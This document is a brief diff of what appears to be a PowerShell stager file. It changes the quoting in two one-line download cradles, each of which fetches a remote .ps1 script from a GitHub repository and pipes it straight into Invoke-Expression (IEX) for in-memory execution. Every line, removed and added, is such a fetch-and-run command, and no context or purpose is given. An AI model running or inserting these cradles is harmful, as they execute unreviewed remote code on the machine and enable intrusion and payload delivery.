@@ -1,2 +1,2 @@
-(new-object system.net.webclient).downloadstring("https://raw.githubusercontent.com/flamebarke/education/main/abpud.ps1")|IEX
-(new-object system.net.webclient).downloadstring("https://raw.githubusercontent.com/flamebarke/education/main/b.ps1")|IEX
+(new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/flamebarke/education/main/abpud.ps1')|IEX
+(new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/flamebarke/education/main/b.ps1')|IEX
